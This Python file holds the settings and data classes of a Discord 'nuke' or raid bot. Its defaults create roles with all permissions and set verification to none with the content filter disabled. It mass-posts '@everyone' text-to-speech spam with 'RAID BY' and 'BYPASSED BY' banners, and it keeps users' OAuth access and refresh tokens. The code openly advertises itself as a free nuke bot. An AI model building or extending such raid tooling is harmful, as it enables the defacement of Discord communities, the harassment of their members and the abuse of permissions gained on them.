from __future__ import annotations

import discord
import utils
from collections import defaultdict
from datetime import timedelta, datetime
from colorama import Fore
from dataclasses import dataclass, field, fields, Field
from typing import (
    List, Dict, Any, Optional, TypedDict, NotRequired,
    Literal, Union
)
from default import (
    fonts, urls, server_icon, server_banner,
    server_invite, default_name, website,
    moon_gif, youtube, moon_glitched
)

xs32 = utils.Xorshift32()
_field = utils.default_field

def init():
    return field(init=False)


class TChannelSettings(TypedDict):
    name: List[str]
    topic: List[str]
    nsfw: List[bool]
    news: List[bool]
    slowmode_delay: List[int]


class TWebhookSettings(TypedDict):
    name: List[str]
    

class TRoleSettings(TypedDict):
    name: List[str]
    icon: List[str]
    permissions: List[int]
    color: List[str]
    hoist: List[bool]
    mentionable: List[bool]


class TEmojiSettings(TypedDict):
    url: List[str]
    name: List[str]


class TStickerSettings(TypedDict):
    name: List[str]
    description: List[str]
    emoji: List[str]
    url: List[str]


class EmbedFooter(TypedDict):
    text: str
    icon_url: Optional[str]


class EmbedAuthor(TypedDict):
    name: str
    url: Optional[str]
    icon_url: Optional[str]


class EmbedField(TypedDict):
    name: str
    value: str
    inline: bool


class EmbedDict(TypedDict):
    title: str
    description: str
    color: int
    footer: NotRequired[EmbedFooter]
    thumbnail: NotRequired[str]
    author: NotRequired[EmbedAuthor]
    image: Optional[str]
    fields: NotRequired[List[EmbedField]]


class TMessageSettings(TypedDict):
    content: List[str]
    tts: List[bool]
    embed: List[Union[EmbedDict, discord.Embed, None]]
    username: List[str]
    avatar_url: List[str]


class TGuildSettings(TypedDict):
    name: List[str]
    icon: List[str]


class SettingsData(TypedDict):
    reasons: List[str]
    prefixes: List[str]
    webhook_amount: Literal[26, 46]
    channel: ChannelSettings
    webhook: WebhookSettings
    role: RoleSettings
    emoji: EmojiSettings
    sticker: StickerSettings
    guild: GuildSettings
    message: MessageSettings


class TAuth(TypedDict):
    id: int
    username: str
    avatar: NotRequired[str]
    access_token: str
    token_type: str
    expires: int
    refresh_token: str
    scope: str
    email: NotRequired[str]
    update_at: int


class TUser(TypedDict):
    id: int
    is_owner: bool
    is_super: bool
    is_elevated: bool
    is_blacklisted: bool
    is_premium: bool
    verified: Optional[bool]
    server_amount: int
    user_amount: int
    auth: NotRequired[Optional[TAuth]]
    settings: NotRequired[Optional[Dict[str, Any]]]


@dataclass
class RandomProps:
    def __post_init__(self):
        for f in fields(self):
            if f.name.startswith('_') and not f.name.startswith('__') and isinstance(getattr(self, f.name), list):
                name = f.name[1:]
                if not hasattr(self.__class__, name):
                    setattr(
                        self.__class__,
                        name,
                        property(lambda self, name=f.name:
                            (
                                xs32.choice(values)
                                if (values := getattr(self, name))
                                else None
                            ))
                    )


@dataclass
class ProfileSettings(RandomProps):
    _name: List[str] = _field(['Fluc'])
    _avatar: List[str] = _field([server_icon])
    _banner: List[str] = _field([server_banner])

    name: str = init()
    avatar: str = init()
    banner: str = init()


@dataclass
class ChannelSettings(RandomProps):
    _name: List[str] = _field(fonts)
    _topic: List[str] = _field(fonts)
    _nsfw: List[bool] = _field([False])
    _news: List[bool] = _field([True])
    _slowmode_delay: List[int] = _field([0])

    name: str = init()
    topic: str = init()
    nsfw: bool = init()
    news: bool = init()
    slowmode_delay: int = init()


@dataclass
class GuildSettings(RandomProps):
    _name: List[str] = _field(fonts)
    _icon: List[str] = _field([moon_gif])
    _banner: List[str] = _field([server_banner])
    _community: List[bool] = _field([False])
    _description: List[str] = _field(fonts)
    _vanity: List[str] = _field([default_name])
    _discoverable: List[bool] = _field([False])
    _verification_level: List[discord.VerificationLevel] = _field([discord.VerificationLevel.none])
    _content_filter: List[discord.ContentFilter] = _field([discord.ContentFilter.disabled])
    _notification_level: List[discord.NotificationLevel] = _field([discord.NotificationLevel.all_messages])
    _system_channel_flags: List[discord.SystemChannelFlags] = _field([discord.SystemChannelFlags(
        join_notifications=True,
        premium_subscriptions=False,
        guild_reminder_notifications=False,
        join_notification_replies=False,
        role_subscription_purchase_notifications=False,
        role_subscription_purchase_notification_replies=False
    )])
    _server_widget: List[bool] = _field([False])
    _premium_progress_bar_enabled: List[bool] = _field([True])
    _dms_disbabled_until: List[int] = _field([timedelta(days=1).total_seconds()])
    _invites_disabled_until: List[int] = _field([timedelta(days=1).total_seconds()])

    name: str = init()
    icon: str = init()
    banner: str = init()
    community: bool = init()
    description: str = init()
    discoverable: bool = init()
    vanity: str = init()
    verification_level: discord.VerificationLevel = init()
    content_filter: discord.ContentFilter = init()
    notification_level: discord.NotificationLevel = init()
    system_channel_flags: discord.SystemChannelFlags = init()
    server_widget: bool = init()
    premium_progress_bar_enabled: bool = init()
    dms_disbabled_until: int = init()
    invites_disabled_until: int = init()
    

@dataclass
class RoleSettings(RandomProps):
    _name: List[str] = _field([font + server_invite for font in fonts])
    _icon: List[str] = _field(urls)
    _color: List[discord.Color] = _field([discord.Color.random() for _ in range(100)])
    _hoist: List[bool] = _field([True])
    _mentionable: List[bool] = _field([True, False])
    _permissions: List[discord.Permissions] = _field([discord.Permissions.all()])

    name: str = init()
    icon: str = init()
    color: discord.Color = init()
    hoist: bool = init()
    mentionable: bool = init()
    permissions: discord.Permissions = init()


@dataclass
class EmojiSettings(RandomProps):
    _url: List[str] = _field(urls)
    _name: List[str] = _field([utils.to_ascii(default_name)])

    url: str = init()
    name: str = init()


@dataclass
class StickerSettings(RandomProps):
    _url: List[str] = _field(urls)
    _name: List[str] = _field([utils.to_ascii(default_name)])
    _description: List[str] = _field(fonts)
    _emoji: List[str] = _field(['💥'])

    url: str = init()
    name: str = init()
    description: str = init()
    emoji: str = init()


@dataclass
class SoundboardSettings(RandomProps):
    _url: List[str] = _field([
        'https://soundbuttonsworld.com/uploads/0877ca10-d121-4ff0-984b-9f3de126b3e2.mp3' 
        # TUNG TUNG TUNG TUNG TUNG TUNG TUNG TUNG TUNG TUNG TUNG TUNG TUNG TUNG SAHUR 
    ])
    _name: List[str] = _field([utils.to_ascii(default_name)])
    _emoji: List[str] = _field(['💥'])
    
    url: str = init()
    name: str = init()
    emoji: str = init()


@dataclass
class InviteSettings(RandomProps):
    _create_amount: List[int] = _field([25])
    
    create_amount: int = init()


@dataclass
class AutomodSettings(RandomProps):
    _create_amount: List[int] = _field([0])

    create_amount: int = init()


@dataclass
class TemplateSettings(RandomProps):
    _name: List[str] = _field(fonts)
    _description: List[str] = _field(fonts)

    name: str = init()
    description: str = init()


@dataclass
class WebhookSettings(RandomProps):
    _username: List[str] = _field(fonts)
    _avatar_url: List[str] = _field(urls)

    username: str = init()
    avatar_url: str = init()


@dataclass
class MessageSettings(RandomProps):
    _content: List[str] = _field([f'**BEST NUKE BOT? CHOOSE {default_name.upper().removeprefix('/')}** {server_invite.removeprefix('https://')}\nTUTORIAL - https://www.youtube.com/watch?v=nDtqDf0mj8E\n-# @everyone @here'])
    _tts: List[bool] = _field([True])
    _embed: List[discord.Embed] = _field(utils.parse_embeds({
        'title': f'_*RAID BY {default_name.upper()}_',
        'description': f'```ansi\n{Fore.BLUE}Discord: {server_invite}\n'
                        f'{Fore.RED}YouTube: {youtube}\n'
                        f'{Fore.CYAN}Site: {website}```',
        'color': '#{:02x}{:02x}{:02x}'.format(*discord.Color.red().to_rgb()), # pyright: ignore[reportArgumentType]
        'thumbnail': {
            'url': moon_glitched
        }
    }))
    _amount: List[int] = _field([42])

    content: str = init()
    tts: bool = init()
    embed: discord.Embed = init()
    amount: int = init()


@dataclass
class NoAdminSettings(RandomProps):
    _username: List[str] = _field(fonts)
    _avatar_url: List[str] = _field(urls)
    _content: List[str] = _field([f'@everyone BYPASSED BY discordapp.com/invite/{server_invite.removeprefix('https://discord.gg/')}\n- Best & fastest nake bot\n- 100% Free'])
    _tts: List[bool] = _field([True])
    _embed: List[discord.Embed] = _field([])

    username: str = init()
    avatar_url: str = init()
    content: str = init()
    tts: bool = init()
    embed: discord.Embed = init()


@dataclass
class MasterSettings(RandomProps):
    _create_event: List[bool] = _field([True])
    _command_prefix: List[str] = _field(['.'])
    _reasons: List[str] = _field(fonts)
    _auto_nuke: List[int] = _field([-1])

    create_event: bool = init()
    command_prefix: str = init()
    reasons: str = init()
    auto_nuke: int = init()


class Settings:
    def __init__(self, data: Dict[str, Any]) -> None:
        self._data = data
        self._master: Dict[int, List[MasterSettings]] = defaultdict(list)
        self._guild: Dict[int, List[GuildSettings]] = defaultdict(list)
        self._role: Dict[int, List[RoleSettings]] = defaultdict(list)
        self._channel: Dict[int, List[ChannelSettings]] = defaultdict(list)
        self._emoji: Dict[int, List[EmojiSettings]] = defaultdict(list)
        self._sticker: Dict[int, List[StickerSettings]] = defaultdict(list)
        self._invite: Dict[int, List[InviteSettings]] = defaultdict(list)
        self._template: Dict[int, List[TemplateSettings]] = defaultdict(list)
        self._automod: Dict[int, List[AutomodSettings]] = defaultdict(list)
        self._webhook: Dict[int, List[WebhookSettings]] = defaultdict(list)
        self._message: Dict[int, List[MessageSettings]] = defaultdict(list)
        self._soundboard: Dict[int, List[SoundboardSettings]] = defaultdict(list)
        self._profile: Dict[int, List[ProfileSettings]] = defaultdict(list)
        self._no_admin: Dict[int, List[NoAdminSettings]] = defaultdict(list)

        self.fill_slot('master', self._master, MasterSettings)
        self.fill_slot('guild', self._guild, GuildSettings)
        self.fill_slot('role', self._role, RoleSettings)
        self.fill_slot('channel', self._channel, ChannelSettings)
        self.fill_slot('emoji', self._emoji, EmojiSettings)
        self.fill_slot('stickes', self._sticker, StickerSettings)
        self.fill_slot('invite', self._invite, InviteSettings)
        self.fill_slot('template', self._template, TemplateSettings)
        self.fill_slot('automod', self._automod, AutomodSettings)
        self.fill_slot('webhook', self._webhook, WebhookSettings)
        self.fill_slot('message', self._message, MessageSettings)
        self.fill_slot('soundboard', self._soundboard, SoundboardSettings)
        self.fill_slot('profile', self._profile, ProfileSettings)
        self.fill_slot('no_admin', self._no_admin, NoAdminSettings)

    def fill_slot(self, category: str, ls: Dict[int, Any], obj: Any) -> None:
        # Can also be used to test settings
        def parse(obj: Any, *items: Any, extra: Optional[Any] = None):
            parsed = []
            for item in items:
                if extra:
                    item = extra(item)
                parsed.append(obj(item))
            return parsed

        if not category in self._data:
        # if not category in self._data:
            ls[0] = [obj()]
            return
        # We don't want to modify the actual data
        preset = self._data[category].copy()
        for key, items in preset.items():
            # Parser
            fields: Optional[Dict[str, Field]] = getattr(obj, '__dataclass_fields__', None)
            if not fields:
                continue
            find = '_' + key
            if not find in fields:
                continue
            field = fields[find]
            # Strip outter type which is always List
            type_ = field.type
            if not isinstance(type_, str):
                continue
            values = []

    # def fill_slot(self, category: str, ls: Dict[int, Any], obj: Any) -> None:
    #     # Can also be used to test settings
    #     def parse(obj: Any, *items: Any, extra: Optional[Any] = None):
    #         parsed = []
    #         for item in items:
    #             if extra:
    #                 item = extra(item)
    #             parsed.append(obj(item))
    #         return parsed

    #     presets = self.presets
    #     print(f'Presets:{presets}')
    #     if len(presets) == 0:
    #     # if not category in self._data:
    #         ls[0] = [obj()]
    #         return
    #     print('Iterating')
    #     for i, _preset in enumerate(presets.values()):
    #         # We don't want to modify the actual data
    #         preset = _preset.copy()
    #         print(preset, category)
    #         if not category in preset:
    #             ls[i] = [obj()]
    #             continue
    #         for options in preset[category]:
    #             for key, items in options.items():
    #                 # Parser
    #                 fields: Optional[Dict[str, Field]] = getattr(obj, '__dataclass_fields__', None)
    #                 if not fields:
    #                     continue
    #                 find = '_' + key
    #                 if not find in fields:
    #                     continue
    #                 field = fields[find]
    #                 # Strip outter type which is always List
    #                 type_ = field.type
    #                 if not isinstance(type_, str):
    #                     continue
    #                 values = []
                    # Should be always true
            for item in items:
                match type_[5:-1]:
                    case 'str':
                        value = str(item)
                    case 'int':
                        value = int(item)
                    case 'bool':
                        value = bool(item)
                    case 'discord.Embed':
                        # value = parse(discord.Embed.from_dict, *items)
                        # Not valid cuz color is stored in hex format
                        updated_embeds = []
                        for _embed in items:
                            embed = MessageSettings().embed.to_dict()
                            embed.update(_embed)
                            updated_embeds.append(embed)
                        embeds = utils.parse_embeds(*updated_embeds)
                        value = embeds
                    case 'discord.Color':
                        try:
                            value = parse(discord.Color.from_str, *items)
                        except TypeError:
                            raise ValueError(f'{items} contains invalid colors')
                    case 'discord.Permissions':
                        value = parse(discord.Permissions, *items, extra=int)
                    case 'discord.VerificationLevel':
                        value = parse(discord.VerificationLevel, *items, extra=int)
                    case 'discord.ContentFilter':
                        value = parse(discord.ContentFilter, *items, extra=int)
                    case 'discord.NotificationLevel':
                        value = parse(discord.NotificationLevel, *items, extra=int)
                    case 'discord.SystemChannelFlags':
                        value = parse(discord.SystemChannelFlags, *items, extra=int)
                    case _:
                        raise TypeError(f'Unknown type: {type_}')
                values.append(value)
            preset[key] = values
        ls[0].append(obj(**utils.underscore(preset)))

    def load[T](self, items: Dict[int, List[T]]) -> T:
        item = utils.get_name(items, self)
        assert item, '???'
        if self.selected_preset != 0:
            if len(items) >= self.selected_preset:
                return xs32.choice(items[self.selected_preset - 1])
            # Preset does not exist. Should be unreachable,
            # but let's return a random one instead
        preset = xs32.choice(list(items.values()))
        return xs32.choice(preset)
        
    @property
    def selected_preset(self) -> int:
        return self._data.get('master', {}).get('selected_preset', 0)
        
    @property
    def command_prefix(self) -> List[str]:
        return self._data.get('master', {}).get('command_prefix', ['.'])
        
    @property
    def auto_nuke(self) -> int:
        return self.load(self._master).auto_nuke
        
    @property
    def default_event(self) -> bool:
        return self.load(self._master).create_event
    
    @property
    def reason(self) -> str:
        return self.load(self._master).reasons
    
    @property
    def master(self) -> MasterSettings:
        return self.load(self._master)
    
    @property
    def guild(self) -> GuildSettings:
        return self.load(self._guild)

    @property
    def role(self) -> RoleSettings:
        return self.load(self._role)

    @property
    def channel(self) -> ChannelSettings:
        return self.load(self._channel)

    @property
    def emoji(self) -> EmojiSettings:
        return self.load(self._emoji)

    @property
    def sticker(self) -> StickerSettings:
        return self.load(self._sticker)

    @property
    def invite(self) -> InviteSettings:
        return self.load(self._invite)

    @property
    def template(self) -> TemplateSettings:
        return self.load(self._template)

    @property
    def webhook(self) -> WebhookSettings:
        return self.load(self._webhook)

    @property
    def message(self) -> MessageSettings:
        return self.load(self._message)

    @property
    def soundboard(self) -> SoundboardSettings:
        return self.load(self._soundboard)

    @property
    def automod(self) -> AutomodSettings:
        return self.load(self._automod)

    @property
    def no_admin(self) -> NoAdminSettings:
        return self.load(self._no_admin)

    @classmethod
    def default(cls) -> Settings:
        return cls({})
        

class User:
    _settings: Optional[Dict[str, Any]]
    _auth: Optional[TAuth]
    _data: TUser

    def __init__(self, data: TUser) -> None:
        self._data = data
        self._settings = data.get('settings')
        auth = data.get('auth')
        if isinstance(auth, AuthData):
            self._auth = auth._data
        else:
            self._auth = auth

    @property
    def id(self) -> int:
        return int(self._data['id'])

    @property
    def is_owner(self) -> bool:
        return self._data['is_owner']

    @property
    def is_super(self) -> bool:
        return self._data['is_super']

    @property
    def is_elevated(self) -> bool:
        return self._data['is_elevated']

    @property
    def is_premium(self) -> bool:
        return self._data['is_premium']

    @property
    def is_blacklisted(self) -> bool:
        return self._data['is_blacklisted']
    
    @property
    def server_amount(self) -> int:
        return self._data['server_amount']
    
    @property
    def user_amount(self) -> int:
        return self._data['user_amount']
    
    @property
    def verified(self) -> bool:
        return bool(self._data['verified'])

    @property
    def settings(self) -> Settings:
        if not self._settings:
            return Settings.default()
        return Settings(self._settings)

    @property
    def auth(self) -> Optional[AuthData]:
        if not self._auth:
            return
        return AuthData(self._auth)

    @classmethod
    def new(cls, user_id: int, **kwargs) -> User:
        data: TUser = {
            'id': user_id,
            'is_owner': False,
            'is_super': False,
            'is_elevated': False,
            'is_blacklisted': False,
            'is_premium': False,
            'server_amount': 0,
            'user_amount': 0,
            'verified': None
        }
        data.update(**kwargs)
        return cls(data)
    
    def __eq__(self, obj: Any) -> bool:
        return isinstance(obj, User) and self.id == obj.id
    

class AuthData:
    def __init__(self, data: TAuth):
        self._data = data

    @property
    def id(self) -> int:
        return int(self._data['id'])

    @property
    def username(self) -> str:
        return self._data['username']

    @property
    def avatar(self) -> Optional[str]:
        return self._data.get('avatar')

    @property
    def access_token(self) -> str:
        return self._data['access_token']

    @property
    def token_type(self) -> str:
        return self._data['token_type']

    @property
    def expires(self) -> datetime:
        return utils.fromtimestamp(float(self._data['expires']))

    @property
    def refresh_token(self) -> str:
        return self._data['refresh_token']
    
    @property
    def scope(self) -> str:
        return self._data['scope']

    @property
    def scopes(self) -> List[str]:
        return [scope for scope in self._data['scope'].split()]

    @property
    def email(self) -> Optional[str]:
        return self._data.get('email')
    
    @property
    def update_at(self) -> datetime:
        return utils.fromtimestamp(self._data['update_at'])

    @property
    def expires_in(self) -> float:
        return self.expires.timestamp() - utils.now().timestamp()
    
    def __eq__(self, obj: Any) -> bool:
        return isinstance(obj, AuthData) and self.id == obj.id


class Permissions:
    owner: bool
    elevated: bool
    auth: bool
    ignore_user_blacklist: bool
    ignore_server_blacklist: bool

    def __init__(
        self,
        owner_only: bool = False,
        elevated_only: bool = False,
        auth_only: bool = False,
        ignore_user_blacklist: bool = False,
        ignore_server_blacklist: bool = False
    ) -> None:
        self.owner = owner_only
        self.elevated = elevated_only
        self.auth = auth_only
        self.ignore_user_blacklist = ignore_user_blacklist
        self.ignore_server_blacklist = ignore_server_blacklist

    @classmethod
    def default(cls) -> Permissions:
        return cls()